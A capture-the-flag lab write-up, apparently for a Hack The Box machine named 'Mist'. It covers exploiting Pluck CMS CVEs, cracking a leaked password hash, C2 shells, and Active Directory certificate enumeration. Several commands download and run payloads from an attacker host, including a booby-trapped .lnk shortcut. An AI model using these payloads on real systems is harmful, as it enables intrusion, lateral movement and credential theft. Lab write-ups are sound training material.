## HOST RECON

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
```


## WEB RECON

- http://10.10.11.17/?file=mist

- http://10.10.11.17/login.php

- http://10.10.11.17/docs/

pluck 4.7.18 © 2005-2025. pluck is available under the terms of the GNU General Public License.

Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at 10.10.11.17 Port 80


#### cve-2024-9405

- https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405

```
http://10.10.11.17/data/settings/modules/albums/

admin_backup.php
mist.php
mist/
```

```
└─$ curl http://10.10.11.17/data/modules/albums/albums_getimage.php?image=mist.php       
<?php
$album_name = 'Mist';
?>30  
```

```
└─$ curl http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>146  
```

```
https://hashes.com/en/decrypt/hash

c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e:lexypoo97
```

#### CVE-2023-50564

- https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC
- follow steps, start listner and get shell
- ```curl http://10.10.14.55:8000/xeu.exe -o xeu.exe ; .\xeu.exe```

powershell%20-c%20Invoke-WebRequest%20-Uri%20http://10.10.14.55:8000/rev.ps1%20-OutFile%20C:/Windows/Temp/rev.ps1;%20powershell%20-c%20C:/Windows/Temp/rev.ps1


```
PS C:\xampp\htdocs\data\modules\rev>whoami
ms01\svc_web
```

## shell as ms01\svc_web

```
PS C:\xampp\htdocs\data\modules\rev>whoami /all

USER INFORMATION
----------------

User Name    SID                                           
============ ==============================================
ms01\svc_web S-1-5-21-1075431363-3458046882-2723919965-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


```
PS C:\xampp\htdocs\data\modules\rev>net users

User accounts for \\MS01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
svc_web                  WDAGUtilityAccount       
The command completed successfully.


C:\xampp\htdocs\data\modules\rev>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.100.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100
```

```
PS C:\xampp\htdocs\data\modules\rev>dir C:\Users\
 Volume in drive C has no label.
 Volume Serial Number is 560D-8100

 Directory of C:\Users

02/21/2024  01:37 PM    <DIR>          .
04/18/2025  03:03 AM    <DIR>          Administrator
02/20/2024  07:02 AM    <DIR>          Administrator.MIST
04/18/2025  03:02 AM    <DIR>          Brandon.Keywarp
02/20/2024  06:44 AM    <DIR>          Public
02/20/2024  10:39 AM    <DIR>          Sharon.Mullard
04/18/2025  03:02 AM    <DIR>          svc_web

```


```
PS C:\xampp\htdocs\data\modules\rev>netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49710          0.0.0.0:0              LISTENING       InHost      
  TCP    192.168.100.101:80     10.10.14.56:42386      ESTABLISHED     InHost      
  TCP    192.168.100.101:139    0.0.0.0:0              LISTENING       InHost      
  TCP    192.168.100.101:62242  10.10.14.56:1234       ESTABLISHED     InHost      
  TCP    [::]:80                [::]:0                 LISTENING       InHost      
  TCP    [::]:135               [::]:0                 LISTENING       InHost      
  TCP    [::]:443               [::]:0                 LISTENING       InHost      
  TCP    [::]:445               [::]:0                 LISTENING       InHost      
  TCP    [::]:5985              [::]:0                 LISTENING       InHost      
  TCP    [::]:47001             [::]:0                 LISTENING       InHost      
  TCP    [::]:49664             [::]:0                 LISTENING       InHost      
  TCP    [::]:49665             [::]:0                 LISTENING       InHost      
  TCP    [::]:49666             [::]:0                 LISTENING       InHost      
  TCP    [::]:49667             [::]:0                 LISTENING       InHost      
  TCP    [::]:49670             [::]:0                 LISTENING       InHost      
  TCP    [::]:49710             [::]:0                 LISTENING       InHost      
  UDP    0.0.0.0:123            *:*                                                
  UDP    0.0.0.0:500            *:*                                                
  UDP    0.0.0.0:4500           *:*                                                
  UDP    0.0.0.0:5353           *:*                                                
  UDP    0.0.0.0:5355           *:*                                                
  UDP    127.0.0.1:51371        127.0.0.1:51371                                    
  UDP    127.0.0.1:51373        127.0.0.1:51373                                    
  UDP    127.0.0.1:54856        127.0.0.1:54856                                    
  UDP    127.0.0.1:61179        127.0.0.1:61179                                    
  UDP    192.168.100.101:137    *:*                                                
  UDP    192.168.100.101:138    *:*                                                
  UDP    [::]:123               *:*                                                
  UDP    [::]:500               *:*                                                
  UDP    [::]:4500              *:*  
```


```
PS C:\xampp\htdocs\data\modules\rev>more C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

## guessing lateral moviment with .lnk file

- https://medium.com/@dbilanoski/how-to-tuesdays-shortcuts-with-powershell-how-to-make-customize-and-point-them-to-places-1ee528af2763


```
$WScriptShell = New-Object -ComObject WScript.Shell

$Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Calculator.lnk")

$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

$Shortcut.Arguments = "curl http://10.10.14.255:8000/xeu2.exe -o C:\xampp\htdocs\xeu2.exe; C:\xampp\htdocs\xeu2.exe"

$Shortcut.save()
```

## shell as brandon.keywarp

```
whoami /all

USER INFORMATION
----------------

User Name            SID                                           
==================== ==============================================
mist\brandon.keywarp S-1-5-21-1045809509-3006658589-2426055941-1110


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
sliver (GRATEFUL_PERCH) > execute -o cmd /c 'ipconfig /all'

[*] Output:

Windows IP Configuration

   Host Name . . . . . . . . . . . . : MS01
   Primary Dns Suffix  . . . . . . . : mist.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : mist.htb

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter
   Physical Address. . . . . . . . . : 00-15-5D-16-CB-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.100.101(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100
   DNS Servers . . . . . . . . . . . : 192.168.100.100
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

```
sliver (GRATEFUL_PERCH) > netstat -T -u -n -l 

 Protocol   Local Address         Foreign Address   State    PID/Program Name 
========== ===================== ================= ======== ==================
 udp        0.0.0.0:123           0.0.0.0:0                  356/svchost.exe  
 udp        0.0.0.0:500           0.0.0.0:0                  1100/svchost.exe 
 udp        0.0.0.0:4500          0.0.0.0:0                  1100/svchost.exe 
 udp        0.0.0.0:5353          0.0.0.0:0                  876/svchost.exe  
 udp        0.0.0.0:5355          0.0.0.0:0                  876/svchost.exe  
 udp        0.0.0.0:61678         0.0.0.0:0                  876/svchost.exe  
 udp        127.0.0.1:52242       0.0.0.0:0                  660/lsass.exe    
 udp        127.0.0.1:52244       0.0.0.0:0                  1064/svchost.exe 
 udp        127.0.0.1:52247       0.0.0.0:0                  1100/svchost.exe 
 udp        127.0.0.1:56680       0.0.0.0:0                  876/svchost.exe  
 udp        192.168.100.101:137   0.0.0.0:0                  4/System         
 udp        192.168.100.101:138   0.0.0.0:0                  4/System         
 tcp        0.0.0.0:80            0.0.0.0:0         LISTEN   2536/httpd.exe   
 tcp        0.0.0.0:135           0.0.0.0:0         LISTEN   864/svchost.exe  
 tcp        0.0.0.0:443           0.0.0.0:0         LISTEN   2536/httpd.exe   
 tcp        0.0.0.0:445           0.0.0.0:0         LISTEN   4/System         
 tcp        0.0.0.0:5985          0.0.0.0:0         LISTEN   4/System         
 tcp        0.0.0.0:47001         0.0.0.0:0         LISTEN   4/System         
 tcp        0.0.0.0:49664         0.0.0.0:0         LISTEN   660/lsass.exe    
 tcp        0.0.0.0:49665         0.0.0.0:0         LISTEN   540/wininit.exe  
 tcp        0.0.0.0:49666         0.0.0.0:0         LISTEN   408/svchost.exe  
 tcp        0.0.0.0:49667         0.0.0.0:0         LISTEN   660/lsass.exe    
 tcp        0.0.0.0:49668         0.0.0.0:0         LISTEN   1100/svchost.exe 
 tcp        0.0.0.0:49717         0.0.0.0:0         LISTEN   648/services.exe 
 tcp        192.168.100.101:139   0.0.0.0:0         LISTEN   4/System 
```

```
sliver (CAUTIOUS_WEDGE) > sharpview find-interestingdomainacl
...

ObjectDN                       : CN=svc_cabackup,CN=Users,DC=mist,DC=htb
ObjectAceFlags                 : ObjectAceTypePresent
ObjectAceType                  : 5b47d60f-6090-40b2-9f37-2a4de88f3063
BinaryLength                   : 56
AceQualifier                   : AccessAllowed
IsCallback                     : False
OpaqueLength                   : 0
AccessMask                     : 48
SecurityIdentifier             : S-1-5-21-1045809509-3006658589-2426055941-1132
AceType                        : AccessAllowedObject
AceFlags                       : None
IsInherited                    : False
InheritanceFlags               : None
PropagationFlags               : None
AuditFlags                     : None
ActiveDirectoryRights          : ReadProperty, WriteProperty
IdentityReferenceName          : Certificate Services
IdentityReferenceDomain        : mist.htb
IdentityReferenceDN            : CN=Certificate Services,CN=Users,DC=mist,DC=htb
```

```
sliver (CAUTIOUS_WEDGE) > sharpview get-domainuser -Properties distinguishedname,memberof

[*] sharpview output:
[Get-DomainSearcher] search base: LDAP://DC=MIST,DC=HTB
[Get-DomainUser] filter string: (&(samAccountType=805306368))
distinguishedname              : CN=Administrator,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Group Policy Creator Owners,CN=Users,DC=mist,DC=htb, CN=Domain Admins,CN=Users,DC=mist,DC=htb, CN=Enterprise Admins,CN=Users,DC=mist,DC=htb, CN=Schema Admins,CN=Users,DC=mist,DC=htb, CN=Administrators,CN=Builtin,DC=mist,DC=htb}

distinguishedname              : CN=Guest,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Guests,CN=Builtin,DC=mist,DC=htb}

distinguishedname              : CN=krbtgt,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Sharon.Mullard,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Brandon.Keywarp,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Florence.Brown,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Jonathan.Clinton,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Markus.Roheb,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Shivangi.Sumpta,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=Harry.Beaucorn,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=op_Sharon.Mullard,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Operatives,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=op_Markus.Roheb,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Operatives,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=svc_smb,CN=Users,DC=mist,DC=htb

distinguishedname              : CN=svc_cabackup,CN=Users,DC=mist,DC=htb
memberof                       : {CN=Certificate Services,CN=Users,DC=mist,DC=htb
```

```
sliver (CAUTIOUS_WEDGE) > sharpview get-domaingroup -Properties distinguishedname,samaccountname,member

[*] sharpview output:
[Get-DomainSearcher] search base: LDAP://DC=MIST,DC=HTB
[Get-DomainGroup] filter string: (&(objectCategory=group))
distinguishedname              : CN=Administrators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Administrators
member                         : {CN=Domain Admins,CN=Users,DC=mist,DC=htb, CN=Enterprise Admins,CN=Users,DC=mist,DC=htb, CN=Administrator,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Users
member                         : {CN=Domain Users,CN=Users,DC=mist,DC=htb, CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mist,DC=htb, CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=mist,DC=htb}

distinguishedname              : CN=Guests,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Guests
member                         : {CN=Domain Guests,CN=Users,DC=mist,DC=htb, CN=Guest,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Print Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Print Operators

distinguishedname              : CN=Backup Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Backup Operators
member                         : {CN=ServiceAccounts,OU=Services,DC=mist,DC=htb}

distinguishedname              : CN=Replicator,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Replicator

distinguishedname              : CN=Remote Desktop Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Remote Desktop Users

distinguishedname              : CN=Network Configuration Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Network Configuration Operators

distinguishedname              : CN=Performance Monitor Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Performance Monitor Users

distinguishedname              : CN=Performance Log Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Performance Log Users

distinguishedname              : CN=Distributed COM Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Distributed COM Users

distinguishedname              : CN=IIS_IUSRS,CN=Builtin,DC=mist,DC=htb
samaccountname                 : IIS_IUSRS
member                         : {CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=mist,DC=htb}

distinguishedname              : CN=Cryptographic Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Cryptographic Operators

distinguishedname              : CN=Event Log Readers,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Event Log Readers

distinguishedname              : CN=Certificate Service DCOM Access,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Certificate Service DCOM Access
member                         : {CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mist,DC=htb}

distinguishedname              : CN=RDS Remote Access Servers,CN=Builtin,DC=mist,DC=htb
samaccountname                 : RDS Remote Access Servers

distinguishedname              : CN=RDS Endpoint Servers,CN=Builtin,DC=mist,DC=htb
samaccountname                 : RDS Endpoint Servers

distinguishedname              : CN=RDS Management Servers,CN=Builtin,DC=mist,DC=htb
samaccountname                 : RDS Management Servers

distinguishedname              : CN=Hyper-V Administrators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Hyper-V Administrators

distinguishedname              : CN=Access Control Assistance Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Access Control Assistance Operators

distinguishedname              : CN=Remote Management Users,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Remote Management Users
member                         : {CN=Operatives,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Storage Replica Administrators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Storage Replica Administrators

distinguishedname              : CN=Domain Computers,CN=Users,DC=mist,DC=htb
samaccountname                 : Domain Computers

distinguishedname              : CN=Domain Controllers,CN=Users,DC=mist,DC=htb
samaccountname                 : Domain Controllers

distinguishedname              : CN=Schema Admins,CN=Users,DC=mist,DC=htb
samaccountname                 : Schema Admins
member                         : {CN=Administrator,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Enterprise Admins,CN=Users,DC=mist,DC=htb
samaccountname                 : Enterprise Admins
member                         : {CN=Administrator,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Cert Publishers,CN=Users,DC=mist,DC=htb
samaccountname                 : Cert Publishers
member                         : {CN=DC01,OU=Domain Controllers,DC=mist,DC=htb}

distinguishedname              : CN=Domain Admins,CN=Users,DC=mist,DC=htb
samaccountname                 : Domain Admins
member                         : {CN=Administrator,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Domain Users,CN=Users,DC=mist,DC=htb
samaccountname                 : Domain Users

distinguishedname              : CN=Domain Guests,CN=Users,DC=mist,DC=htb
samaccountname                 : Domain Guests

distinguishedname              : CN=Group Policy Creator Owners,CN=Users,DC=mist,DC=htb
samaccountname                 : Group Policy Creator Owners
member                         : {CN=Administrator,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=RAS and IAS Servers,CN=Users,DC=mist,DC=htb
samaccountname                 : RAS and IAS Servers

distinguishedname              : CN=Server Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Server Operators

distinguishedname              : CN=Account Operators,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Account Operators

distinguishedname              : CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Pre-Windows 2000 Compatible Access
member                         : {CN=DC01,OU=Domain Controllers,DC=mist,DC=htb, CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mist,DC=htb}

distinguishedname              : CN=Incoming Forest Trust Builders,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Incoming Forest Trust Builders

distinguishedname              : CN=Windows Authorization Access Group,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Windows Authorization Access Group
member                         : {CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=mist,DC=htb}

distinguishedname              : CN=Terminal Server License Servers,CN=Builtin,DC=mist,DC=htb
samaccountname                 : Terminal Server License Servers

distinguishedname              : CN=Allowed RODC Password Replication Group,CN=Users,DC=mist,DC=htb
samaccountname                 : Allowed RODC Password Replication Group

distinguishedname              : CN=Denied RODC Password Replication Group,CN=Users,DC=mist,DC=htb
samaccountname                 : Denied RODC Password Replication Group
member                         : {CN=Read-only Domain Controllers,CN=Users,DC=mist,DC=htb, CN=Group Policy Creator Owners,CN=Users,DC=mist,DC=htb, CN=Domain Admins,CN=Users,DC=mist,DC=htb, CN=Cert Publishers,CN=Users,DC=mist,DC=htb, CN=Enterprise Admins,CN=Users,DC=mist,DC=htb, CN=Schema Admins,CN=Users,DC=mist,DC=htb, CN=Domain Controllers,CN=Users,DC=mist,DC=htb, CN=krbtgt,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Read-only Domain Controllers,CN=Users,DC=mist,DC=htb
samaccountname                 : Read-only Domain Controllers

distinguishedname              : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=mist,DC=htb
samaccountname                 : Enterprise Read-only Domain Controllers

distinguishedname              : CN=Cloneable Domain Controllers,CN=Users,DC=mist,DC=htb
samaccountname                 : Cloneable Domain Controllers

distinguishedname              : CN=Protected Users,CN=Users,DC=mist,DC=htb
samaccountname                 : Protected Users

distinguishedname              : CN=Key Admins,CN=Users,DC=mist,DC=htb
samaccountname                 : Key Admins

distinguishedname              : CN=Enterprise Key Admins,CN=Users,DC=mist,DC=htb
samaccountname                 : Enterprise Key Admins

distinguishedname              : CN=DnsAdmins,CN=Users,DC=mist,DC=htb
samaccountname                 : DnsAdmins

distinguishedname              : CN=DnsUpdateProxy,CN=Users,DC=mist,DC=htb
samaccountname                 : DnsUpdateProxy

distinguishedname              : CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
samaccountname                 : ServiceAccounts

distinguishedname              : CN=Operatives,CN=Users,DC=mist,DC=htb
samaccountname                 : Operatives
member                         : {CN=op_Markus.Roheb,CN=Users,DC=mist,DC=htb, CN=op_Sharon.Mullard,CN=Users,DC=mist,DC=htb}

distinguishedname              : CN=Certificate Managers,CN=Users,DC=mist,DC=htb
samaccountname                 : Certificate Managers

distinguishedname              : CN=Virtualization Services,OU=Services,DC=mist,DC=htb
samaccountname                 : Virtualization Services

distinguishedname              : CN=Certificate Services,CN=Users,DC=mist,DC=htb
samaccountname                 : Certificate Services
member                         : {CN=svc_cabackup,CN=Users,DC=mist,DC=htb, CN=svc_ca,CN=Managed Service Accounts,DC=mist,DC=htb}

distinguishedname              : CN=CA Backup,CN=Users,DC=mist,DC=htb
samaccountname                 : CA Backup
member                         : {CN=Certificate Managers,CN=Users,DC=mist,DC=htb}
```

```
sliver (CAUTIOUS_WEDGE) > sharpview get-domaingroup -MemberIdentity Brandon.Keywarp

[*] sharpview output:
[Get-DomainSearcher] search base: LDAP://DC=MIST,DC=HTB
[Get-DomainSearcher] search base: LDAP://DC=MIST,DC=HTB
[Get-DomainObject] Get-DomainComputer filter string: (&(|(|(samAccountName=Brandon.Keywarp)(name=Brandon.Keywarp)(dnshostname=Brandon.Keywarp))))
[Get-DomainSearcher] search base: LDAP://DC=MIST,DC=HTB
[Get-DomainObject] Get-DomainComputer filter string: (&(|(objectsid=S-1-5-21-1045809509-3006658589-2426055941-513)))
objectsid                      : {S-1-5-21-1045809509-3006658589-2426055941-513}
grouptype                      : GLOBAL_SCOPE, SECURITY
samaccounttype                 : GROUP_OBJECT
objectguid                     : a44a6284-3dc8-4e64-b04a-905a2a777fbb
name                           : Domain Users
distinguishedname              : CN=Domain Users,CN=Users,DC=mist,DC=htb
whencreated                    : 2/15/2024 12:32:23 PM
whenchanged                    : 2/15/2024 12:32:23 PM
samaccountname                 : Domain Users
memberof                       : {CN=Users,CN=Builtin,DC=mist,DC=htb}
cn                             : {Domain Users}
objectclass                    : {top, group}
usnchanged                     : 12350
description                    : All domain users
instancetype                   : 4
usncreated                     : 12348
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=mist,DC=htb
iscriticalsystemobject         : True
dscorepropagationdata          : {2/15/2024 12:32:23 PM, 1/1/1601 12:00:01 AM}
```

#### bh data

- sliver bh collector
```sharp-hound-4 -- '-c all'```


```
- ms01.mist.htb ---> HasSession ---> brandon.keywarp

The user BRANDON.KEYWARP@MIST.HTB has a session on the computer MS01.MIST.HTB.

When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.

- brandon.keywarp ---> memberof ---> authenticated users, everyone, certificate service dcom access

- OutBound path:

brandon.keywarp ---> memberof ---> domain users ---> memberof ---> authenticated users ---> enroll mist-dc01-ca
                                                |___ enroll ---> userauthentication, usersignature, efs, clientauth, user


The group AUTHENTICATED USERS@MIST.HTB has enrollment rights against the target node, MIST-DC01-CA@MIST.HTB.

The target node may be a Certificate Template or an Enterprise Certification Authority.

Certify can be used to enroll a certificate:

Certify.exe request /ca:SERVER\CA-NAME /template:TEMPLATE

certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE

The following requirements must be met for a principal to be able to enroll a certificate:
1) The principal has enrollment rights on a certificate template
2) The certificate template is published on an enterprise CA
3) The principal has Enroll permission on the enterprise CA
4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template                                                

- https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf


- sharon.mullard ---> same of brandon.keywarp

- florence.brown ---> same of brandon.keywarp

- jonathan.clinton ---> same of brandon.keywarp

- markus.roheb ---> same of brandon.keywarp

- shivangi.sumpta ---> same of brandon.keywarp

- harry.beaucorn ---> same of brandon.keywarp

- op_sharon.mullard ---> same of brandon.keywarp
                    |___ memberof ---> operatives ---> readGMSApassword ---> svc_ca$
                                       |___ CanPSRemote ---> dc01.mist.htb
                    |___ memberof ---> remote management users

- op_markus.roheb ---> same of op_sharon.mullard

- svc_ca$ ---> same of brandon.keywarp
         |___ memberof ---> certificate services ---> AddKeyCredentialLink ---> svc_cabackup
                            |___ Enroll ---> managerauthentication

- svc_cabackup ---> same of brandon.keywarp
               |___ memberof ---> certificate services ---> Enroll ---> managerauthentication

- svc_smb ---> same of brandon.keywarp

```

#### enrollment certificate abuse

- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin


```
sliver (GRATEFUL_PERCH) > certify find /enrollable

[*] certify output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mist,DC=htb'

[*] Listing info about the Enterprise CA 'mist-DC01-CA'

    Enterprise CA Name            : mist-DC01-CA
    DNS Hostname                  : DC01.mist.htb
    FullName                      : DC01.mist.htb\mist-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb
    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E
    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0
    Cert Start Date               : 2/15/2024 7:07:23 AM
    Cert End Date                 : 2/15/2123 7:17:23 AM
    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
